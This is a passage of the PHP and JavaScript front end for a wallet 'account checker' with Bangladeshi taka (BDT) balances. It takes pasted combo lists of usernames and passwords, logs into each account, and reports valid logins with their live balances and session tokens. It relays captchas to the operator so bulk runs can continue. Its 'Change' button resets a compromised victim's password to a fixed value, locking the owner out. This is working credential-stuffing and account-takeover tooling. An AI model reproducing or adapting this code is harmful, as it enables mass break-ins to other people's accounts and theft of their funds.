        <span class="code"><?= e((string) $flash['code']) ?></span>
      <?php endif; ?>
    </div>
  <?php endif; ?>

  <div class="workspace">
    <section class="card" id="single">
      <div class="card-head">
        <span class="card-icon" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21a8 8 0 0 0-16 0"/><circle cx="12" cy="7" r="4"/><path d="m17 11 2 2 4-4"/></svg>
        </span>
        <div class="card-title">
          <h2>Single check</h2>
          <p>Sign in and fetch the current wallet balance.</p>
        </div>
      </div>

      <form method="post" autocomplete="off" id="singleForm">
        <input type="hidden" name="csrf" value="<?= e($csrf) ?>">
        <input type="hidden" name="action" value="login">
        <div class="field">
          <label for="credentials">Username | password</label>
          <div class="input-shell">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            <input id="credentials" name="credentials" value="<?= e((string) ($_POST['credentials'] ?? '')) ?>" placeholder="username | password" required autofocus autocomplete="off" spellcheck="false">
          </div>
          <span class="field-hint">Separate the username and password with a pipe.</span>
        </div>
        <div id="captchaSlot">
          <?php if (!empty($_SESSION['captcha_image'])): ?>
            <div class="field">
              <label for="captcha">Captcha</label>
              <img class="captcha-img" src="<?= e((string) $_SESSION['captcha_image']) ?>" alt="Captcha challenge">
              <div class="input-shell"><input id="captcha" name="captcha" placeholder="Enter captcha" autocomplete="off"></div>
            </div>
          <?php endif; ?>
        </div>
        <button class="btn btn-primary btn-block" type="submit" id="singleBtn">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3 4.5 6v5.5c0 4.4 3.1 7.7 7.5 9.5 4.4-1.8 7.5-5.1 7.5-9.5V6L12 3Z"/><path d="m8.8 12 2.1 2.1 4.4-4.4"/></svg>
          <span>Check account</span>
        </button>
        <div class="status" id="singleStatus" role="status" hidden></div>
      </form>

      <div class="result" id="singleResult" hidden>
        <div class="result-head">
          <span class="avatar" id="resAvatar">?</span>
          <span class="result-id">
            <strong id="resUser">Account</strong>
            <span class="pill ok" id="resState">Valid</span>
          </span>
          <span class="token" id="resToken"></span>
        </div>
        <div class="balance-tile">
          <div class="balance-main">
            <span class="tile-label">Wallet balance</span>
            <strong id="resBalance">—</strong>
          </div>
          <span class="tile-note">Live</span>
        </div>
        <div class="detail-grid" id="resDetails"></div>
      </div>
    </section>

    <section class="card" id="bulk">
      <div class="card-head">
        <span class="card-icon" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 6h13"/><path d="M8 12h13"/><path d="M8 18h13"/><path d="M3 6h.01"/><path d="M3 12h.01"/><path d="M3 18h.01"/></svg>
        </span>
        <div class="card-title">
          <h2>Bulk check</h2>
          <p>Paste one account per line and watch results arrive.</p>
        </div>
        <span class="count-badge" id="bulkCount">0 lines</span>
      </div>

      <form method="post" autocomplete="off" id="bulkForm">
        <textarea class="bulk-input" id="bulkInput" name="bulk" placeholder="username | password&#10;username:password&#10;https://site.com/login username password"><?= e((string) ($_POST['bulk'] ?? '')) ?></textarea>
        <div class="bulk-actions">
          <button class="btn btn-primary" type="button" id="bulkBtn">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 12 5 5L20 7"/></svg>
            <span>Check all</span>
          </button>
          <button class="btn btn-ghost" type="button" id="bulkClear">Clear</button>
          <span class="field-hint">Pipe or space separated</span>
        </div>
      </form>

      <div class="status" id="bulkStatus" role="status" hidden></div>

      <div class="table-wrap" id="bulkWrap" hidden>
        <table class="result-table">
          <thead>
            <tr><th>Account</th><th>Balance</th><th>Status</th><th>Actions</th></tr>
          </thead>
          <tbody id="bulkTable"></tbody>
        </table>
      </div>

      <div class="empty-state" id="bulkEmpty">
        <div>
          <span class="empty-icon" aria-hidden="true">
            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
          </span>
          <strong>No checks yet</strong>
          <span>Results will appear here with live balances.</span>
        </div>
      </div>
    </section>
  </div>

  <?php if (is_array($session)): ?>
  <section class="card session-card">
    <div class="card-head">
      <span class="card-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21a8 8 0 0 0-16 0"/><circle cx="12" cy="7" r="4"/></svg>
      </span>
      <div class="card-title">
        <h2>Session</h2>
        <p>Your signed-in account.</p>
      </div>
    </div>
    <div class="session-top">
      <div class="session-meta">
        <span class="pill <?= $profileOk ? 'ok' : 'err' ?>"><?= $profileOk ? 'Session valid' : 'Session invalid' ?></span>
        <span class="token">token <?= e(ckMaskToken($session['token'])) ?> · merchant <?= e((string) $session['merchantCode']) ?></span>
      </div>
      <form method="post" style="margin:0">
        <input type="hidden" name="csrf" value="<?= e($csrf) ?>">
        <input type="hidden" name="action" value="logout">
        <button class="btn btn-ghost btn-sm" type="submit">Sign out</button>
      </form>
    </div>
    <?php if ($balance !== null): ?>
      <div class="balance-tile">
        <div class="balance-main">
          <span class="tile-label">Wallet balance</span>
          <strong><?= e($balance) ?> BDT</strong>
        </div>
        <span class="tile-note">Live</span>
      </div>
    <?php endif; ?>
    <?php if ($profileOk && $profile !== []): ?>
      <div class="detail-grid">
        <?php foreach (ckProfileRows($profile) as $k => $val): ?>
          <div class="detail-item">
            <span class="detail-label"><?= e((string) $k) ?></span>
            <span class="detail-value"><?= e((string) $val) ?></span>
          </div>
        <?php endforeach; ?>
      </div>
    <?php endif; ?>
    <div class="session-actions">
      <a class="btn btn-ghost btn-sm" href="./">Refresh account data</a>
      <?php if ($agentFunds === null): ?>
        <form method="post" style="margin:0">
          <input type="hidden" name="csrf" value="<?= e($csrf) ?>">
          <input type="hidden" name="action" value="agent_funds">
          <button class="btn btn-ghost btn-sm" type="submit">Fetch agent funds</button>
        </form>
      <?php endif; ?>
    </div>
    <?php if ($agentFunds !== null): ?>
      <?php $shown = array_filter($agentFunds, static fn($v) => $v !== null && $v !== []); ?>
      <?php if ($shown === []): ?>
        <p class="field-hint" style="margin-top:14px">All null — this endpoint carries agent contract/salary data.</p>
      <?php else: ?>
        <div class="detail-grid">
          <?php foreach ($shown as $k => $v): ?>
            <div class="detail-item">
              <span class="detail-label"><?= e((string) $k) ?></span>
              <span class="detail-value"><?= e(is_scalar($v) ? (string) $v : (string) json_encode($v)) ?></span>
            </div>
          <?php endforeach; ?>
        </div>
      <?php endif; ?>
    <?php endif; ?>
  </section>
  <?php endif; ?>
</main>

<footer class="site-footer">
  <div class="shell footer-inner">
    <span>&copy; <?= date('Y') ?> <?= e(strtoupper(basename(__DIR__))) ?> checker</span>
    <span><a href="/">All checkers</a> &nbsp;·&nbsp; <a href="./saved.php">Saved accounts</a></span>
  </div>
</footer>

<script>
const CSRF = <?= json_encode($csrf) ?>;
const SITE_ORIGIN = <?= json_encode(CK_ORIGIN) ?>;

function $(id) { return document.getElementById(id); }

function showStatus(el, message, kind) {
  if (!el) return;
  el.hidden = false;
  el.className = 'status ' + (kind || 'info');
  el.textContent = message;
}

function hideStatus(el) {
  if (!el) return;
  el.hidden = true;
  el.className = 'status';
  el.textContent = '';
}

function initials(value) {
  const clean = String(value || '').replace(/[^a-z0-9]/gi, '');
  return (clean.slice(0, 2) || '?').toUpperCase();
}

function formatMoney(value) {
  if (value === null || value === undefined || value === '') return '—';
  const n = Number(value);
  if (!Number.isFinite(n)) return String(value);
  return n.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' BDT';
}

function renderDetails(container, rows) {
  if (!container) return;
  container.textContent = '';
  Object.keys(rows || {}).forEach(function (key) {
    const value = rows[key];
    if (value === null || value === undefined || value === '') return;
    const item = document.createElement('div');
    item.className = 'detail-item';
    const label = document.createElement('span');
    label.className = 'detail-label';
    label.textContent = key;
    const val = document.createElement('span');
    val.className = 'detail-value';
    val.textContent = String(value);
    item.append(label, val);
    container.appendChild(item);
  });
}

function showSingleCaptcha(src) {
  const slot = $('captchaSlot');
  if (!slot || !src) return;
  slot.textContent = '';
  const field = document.createElement('div');
  field.className = 'field';
  const label = document.createElement('label');
  label.htmlFor = 'captcha';
  label.textContent = 'Captcha';
  const img = document.createElement('img');
  img.className = 'captcha-img';
  img.src = src;
  img.alt = 'Captcha challenge';
  const shell = document.createElement('div');
  shell.className = 'input-shell';
  const input = document.createElement('input');
  input.id = 'captcha';
  input.name = 'captcha';
  input.placeholder = 'Enter captcha';
  input.autocomplete = 'off';
  shell.appendChild(input);
  field.append(label, img, shell);
  slot.appendChild(field);
  input.focus();
}

function post(fields) {
  const fd = new FormData();
  fd.append('csrf', CSRF);
  Object.keys(fields).forEach(function (key) { fd.append(key, fields[key]); });
  return fetch(window.location.href, {
    method: 'POST',
    body: fd,
    headers: { 'X-Requested-With': 'XMLHttpRequest' }
  }).then(function (res) {
    return res.text().then(function (text) {
      try { return JSON.parse(text); }
      catch (e) { throw new Error('Unexpected server response'); }
    });
  });
}

function askCaptcha(src) {
  return new Promise(function (resolve) {
    if (!src) { resolve(''); return; }
    const backdrop = document.createElement('div');
    backdrop.className = 'modal-backdrop';
    const card = document.createElement('div');
    card.className = 'modal-card';
    const title = document.createElement('h3');
    title.textContent = 'Captcha required';
    const note = document.createElement('p');
    note.textContent = 'Enter the code shown below to continue this check.';
    const img = document.createElement('img');
    img.src = src;
    img.alt = 'Captcha challenge';
    const shell = document.createElement('div');
    shell.className = 'input-shell';
    const input = document.createElement('input');
    input.placeholder = 'Enter captcha';
    input.autocomplete = 'off';
    shell.appendChild(input);
    const actions = document.createElement('div');
    actions.className = 'modal-actions';
    const cancel = document.createElement('button');
    cancel.type = 'button';
    cancel.className = 'btn btn-ghost';
    cancel.textContent = 'Cancel';
    const submit = document.createElement('button');
    submit.type = 'button';
    submit.className = 'btn btn-primary';
    submit.textContent = 'Continue';
    actions.append(cancel, submit);
    card.append(title, note, img, shell, actions);
    backdrop.appendChild(card);
    document.body.appendChild(backdrop);
    input.focus();
    function finish(value) {
      backdrop.remove();
      resolve(value);
    }
    cancel.addEventListener('click', function () { finish(''); });
    submit.addEventListener('click', function () { finish(input.value.trim()); });
    input.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') { e.preventDefault(); submit.click(); }
    });
  });
}

(function singleCheck() {
  const form = $('singleForm');
  if (!form) return;
  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    const btn = $('singleBtn');
    const status = $('singleStatus');
    const result = $('singleResult');
    if (btn) btn.disabled = true;
    if (result) result.hidden = true;
    showStatus(status, 'Checking account…', 'info');
    const fd = new FormData(form);
    fd.set('action', 'login');
    try {
      const res = await fetch(window.location.href, {
        method: 'POST',
        body: fd,
        headers: { 'X-Requested-With': 'XMLHttpRequest' }
      });
      const j = await res.json();
      if (j.status === 'ok') {
        hideStatus(status);
        const raw = $('credentials') ? $('credentials').value : '';
        const user = (raw.split('|')[0] || j.username || '').trim();
        const profile = j.profile && typeof j.profile === 'object' ? j.profile : {};
        const balance = j.balance !== null && j.balance !== undefined ? j.balance : profile.Balance;
        if ($('resUser')) $('resUser').textContent = user || 'Account';
        if ($('resAvatar')) $('resAvatar').textContent = initials(user);
        if ($('resBalance')) $('resBalance').textContent = formatMoney(balance);
        if ($('resToken')) $('resToken').textContent = j.token ? 'token ' + j.token : '';
        const details = {};
        Object.keys(profile).forEach(function (key) {
          if (key.toLowerCase() !== 'balance') details[key] = profile[key];
        });
        renderDetails($('resDetails'), details);
        if (result) {
          result.hidden = false;
          result.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
      } else {
        showStatus(status, j.message || 'Check failed.', 'error');
        if (j.captcha && j.captcha_image) showSingleCaptcha(j.captcha_image);
      }
    } catch (err) {
      showStatus(status, err.message || 'Check failed.', 'error');
    } finally {
      if (btn) btn.disabled = false;
    }
  });
})();

(function bulkCheck() {
  const btn = $('bulkBtn');
  const input = $('bulkInput');
  const table = $('bulkTable');
  const wrap = $('bulkWrap');
  const empty = $('bulkEmpty');
  const status = $('bulkStatus');
  const count = $('bulkCount');
  if (!btn || !input || !table || !wrap || !empty) return;

  function updateCount() {
    const n = input.value.split(/\r?\n/).filter(function (line) { return line.trim() !== ''; }).length;
    if (count) count.textContent = n + (n === 1 ? ' line' : ' lines');
  }
  input.addEventListener('input', updateCount);
  updateCount();

  function parseLine(line) {
    line = line.trim();
    if (!line || line.startsWith('#')) return null;
    if (/username/i.test(line) && /password/i.test(line)) return null;
    let parts = null;
    if (line.includes('|')) {
      const p = line.split('|').map(function (s) { return s.trim(); }).filter(Boolean);
      if (p.length >= 2) parts = [p[0], p[1]];
    } else if (line.includes(':') && !line.includes('://')) {
      const idx = line.indexOf(':');
      const u = line.slice(0, idx).trim();
      const pw = line.slice(idx + 1).trim();
      if (u && pw) parts = [u, pw];
    } else {
      const p = line.split(/\s+/).filter(Boolean);
      if (p.length >= 3) parts = [p[1], p[2]];
      else if (p.length === 2) parts = [p[0], p[1]];
    }
    if (!parts || !parts[0] || !parts[1]) return null;
    if (String(parts[1]).toLowerCase() === '*none*') return null;
    return parts;
  }

  function makeButton(label, className, handler) {
    const b = document.createElement('button');
    b.type = 'button';
    b.className = className;
    b.textContent = label;
    b.addEventListener('click', handler);
    return b;
  }

  function makeRow(state) {
    const tr = document.createElement('tr');
    const tdUser = document.createElement('td');
    const account = document.createElement('span');
    account.className = 'account-name';
    account.textContent = state.user;
    const token = document.createElement('span');
    token.className = 'row-sub';
    token.hidden = true;
    tdUser.append(account, token);

    const tdB = document.createElement('td');
    tdB.className = 'balance-cell';
    tdB.textContent = '—';

    const tdS = document.createElement('td');
    const pill = document.createElement('span');
    pill.className = 'pill pending';
    pill.textContent = 'Checking…';
    const sub = document.createElement('span');
    sub.className = 'row-sub';
    sub.hidden = true;
    tdS.append(pill, sub);

    const tdA = document.createElement('td');
    tdA.className = 'row-actions';

    tr.append(tdUser, tdB, tdS, tdA);
    return { tr: tr, token: token, balance: tdB, pill: pill, sub: sub, actions: tdA };
  }

  function manualCheck(state) {
    const field = $('credentials');
    if (field) {
      field.value = state.user + ' | ' + state.pass;
      field.focus();
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(state.user + ' | ' + state.pass).catch(function () {});
    }
    window.open(SITE_ORIGIN + '/m/login', '_blank', 'noopener');
  }

  function copyCredential(state, button) {
    const text = state.user + ' | ' + state.pass;
    const done = function () {
      const old = button.textContent;
      button.textContent = 'Copied';
      setTimeout(function () { button.textContent = old; }, 1200);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(done, function () {});
    }
  }

  async function changePassword(state, button, row) {
    if (state.pass === 'juari1122') { alert('Already juari1122'); return; }
    const old = button.textContent;
    button.disabled = true;
    button.textContent = 'Changing…';
    try {
      const j = await post({ action: 'change_password_one', user: state.user, pass: state.pass });
      if (j.status === 'ok') {
        state.pass = 'juari1122';
        button.textContent = 'Changed';
        if (row.sub) {
          row.sub.hidden = false;
          row.sub.textContent = 'Password: juari1122';
        }
      } else {
        button.textContent = 'Failed';
        alert(j.message || 'Password change failed');
      }
    } catch (err) {
      button.textContent = 'Failed';
      alert(err.message || 'Password change failed');
    }
    setTimeout(function () {
      button.textContent = old;
      button.disabled = false;
    }, 1500);
  }

  function addActions(cell, state, row, canManage) {
    cell.textContent = '';
    if (canManage) {
      cell.append(
        makeButton('Copy', 'btn btn-ghost btn-sm', function () { copyCredential(state, this); }),
        makeButton('Change', 'btn btn-ghost btn-sm', function () { changePassword(state, this, row); })
      );
    }
    cell.append(makeButton('Manual', 'btn btn-ghost btn-sm', function () { manualCheck(state); }));
  }

  btn.addEventListener('click', async function () {
    const lines = input.value.split(/\r?\n/).map(parseLine).filter(Boolean);
    if (lines.length === 0) {
      showStatus(status, 'Paste at least one valid account to check.', 'info');
      return;
    }
    btn.disabled = true;
    btn.querySelector('span').textContent = 'Checking…';
    table.textContent = '';
    wrap.hidden = false;
    empty.hidden = true;
    hideStatus(status);
    let valid = 0;
    let invalid = 0;
    let errors = 0;

    for (let i = 0; i < lines.length; i++) {
      const state = { user: lines[i][0], pass: lines[i][1] };
      const row = makeRow(state);
      table.appendChild(row.tr);
      showStatus(status, 'Checked ' + i + ' of ' + lines.length + '…', 'info');

      let j = null;
      try {
        j = await post({ action: 'bulk_check_one', user: state.user, pass: state.pass });
        if (j.status === 'captcha') {
          row.pill.className = 'pill warn';
          row.pill.textContent = 'Captcha';
          const code = await askCaptcha(j.captcha_image);
          if (code) {
            j = await post({
              action: 'bulk_check_one',
              user: state.user,
              pass: state.pass,
              captcha: code,
              captcha_id: j.captcha_id || ''
            });
          }
        }
      } catch (err) {
        j = { status: 'error', message: err.message };
      }

      if (j.status === 'valid') {
        valid++;
        row.pill.className = 'pill ok';
        row.pill.textContent = 'Valid';
        row.balance.textContent = formatMoney(j.balance);
        if (j.token) {
          row.token.hidden = false;
          row.token.textContent = 'token ' + j.token;
        }
        const profile = j.profile && typeof j.profile === 'object' ? j.profile : {};
        const bits = [];
        if (profile['Club tier']) bits.push(profile['Club tier']);
        if (profile['Labels']) bits.push(profile['Labels']);
        if (bits.length) {
          row.sub.hidden = false;
          row.sub.textContent = bits.join(' · ');
        }
        addActions(row.actions, state, row, true);
      } else if (j.status === 'invalid') {
        invalid++;
        row.pill.className = 'pill err';
        row.pill.textContent = 'Invalid';
        addActions(row.actions, state, row, false);
      } else {
        errors++;
        row.pill.className = 'pill err';
        row.pill.textContent = 'Error';
        if (j.message) {
          row.sub.hidden = false;
          row.sub.textContent = j.message;
        }
        addActions(row.actions, state, row, false);
      }
      await new Promise(function (resolve) { setTimeout(resolve, 180); });
    }

    btn.disabled = false;
    btn.querySelector('span').textContent = 'Check all';
    let summary = lines.length + ' checked · ' + valid + ' valid · ' + invalid + ' invalid';
    if (errors) summary += ' · ' + errors + ' error' + (errors === 1 ? '' : 's');
    showStatus(status, summary, valid > 0 ? 'ok' : 'info');
  });

  const clear = $('bulkClear');
  if (clear) {
    clear.addEventListener('click', function () {
      input.value = '';
      table.textContent = '';
      wrap.hidden = true;
      empty.hidden = false;
      hideStatus(status);
      updateCount();
      input.focus();
    });
  }
})();
</script>
</body>
</html>
